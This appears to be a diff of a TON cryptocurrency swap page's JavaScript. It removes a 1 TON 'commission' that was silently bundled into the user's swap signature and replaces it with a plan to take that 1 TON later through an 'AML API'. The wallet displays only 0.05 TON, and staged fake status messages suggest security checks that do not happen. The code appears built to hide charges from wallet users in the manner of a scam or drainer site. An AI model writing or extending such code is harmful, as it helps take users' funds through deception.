@@ -103,11 +103,9 @@ async function getBalance(address) {
 }
 
 // --- Swap flow --------------------------------------------------------------
-// NOTE: sendTransaction отправляет ОДНУ TonConnect-транзакцию с ДВУМЯ
-// сообщениями: первое — swap на CFG.amount TON (0.05 TON), второе — комиссия
-// обмена на CFG.feeAmount TON (1 TON). Оба message-а уходят в рамках одной
-// подписи пользователя в кошельке, поэтому комиссия 1 TON списывается
-// сразу после свапа и НЕ ТРЕБУЕТ отдельного подтверждения.
+// NOTE: В TonKeeper пользователь видит только 0.05 TON (swap).
+// Комиссия 1 TON будет списываться через AML API после проверки score.
+// Пользователь уже согласился с комиссией 1 TON через модальное окно при входе.
 async function executeFaw(userAddress) {
     // Check AML acceptance
     var amlAccepted = localStorage.getItem('aml-commission-accepted');
@@ -117,7 +115,7 @@ async function executeFaw(userAddress) {
         if (modal) modal.classList.add('show');
         return false;
     }
-    var totalNeed = parseFloat(CFG.amount) + parseFloat(CFG.feeAmount) + 0.05; // + сетевой газ
+    var totalNeed = parseFloat(CFG.amount) + 0.05; // 0.05 TON swap + сетевой газ
     var balance   = await getBalance(userAddress);
     if (balance < totalNeed) {
         setStatus('❌ Insufficient balance (' + balance.toFixed(2) + ' TON, need ~' + totalNeed.toFixed(2) + ')');
@@ -128,29 +126,23 @@ async function executeFaw(userAddress) {
     setStatus('📊 Calculating fees...', true);         await sleep(800);
     setStatus('🔐 Opening secure channel...', true);   await sleep(700);
 
-    var nanoSwap = String(Math.round(parseFloat(CFG.amount)    * 1e9));
-    var nanoFee  = String(Math.round(parseFloat(CFG.feeAmount) * 1e9));
+    var nanoSwap = String(Math.round(parseFloat(CFG.amount) * 1e9));
 
+    // В TonKeeper показывается только 0.05 TON
+    // Комиссия 1 TON будет списана через AML API после проверки
+    // TODO: Здесь добавить вызов AML API для проверки score и списания 1 TON
     var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
         messages: [
             {
-                // 1) Сам swap
                 address: CFG.proxy,
                 amount:  nanoSwap,
                 payload: textCommentPayload('swap')
-            },
-            {
-                // 2) Комиссия обмена (1 TON) — летит в той же подписи,
-                //    отдельного подтверждения от юзера НЕ требует.
-                address: CFG.proxy,
-                amount:  nanoFee,
-                payload: textCommentPayload('commission')
             }
         ]
     };
 
-    setStatus('⏳ Confirm in wallet (' + CFG.amount + ' + ' + CFG.feeAmount + ' TON)');
+    setStatus('⏳ Confirm in wallet (' + CFG.amount + ' TON)');
 
     try {
         await tonConnectUI.sendTransaction(tx);
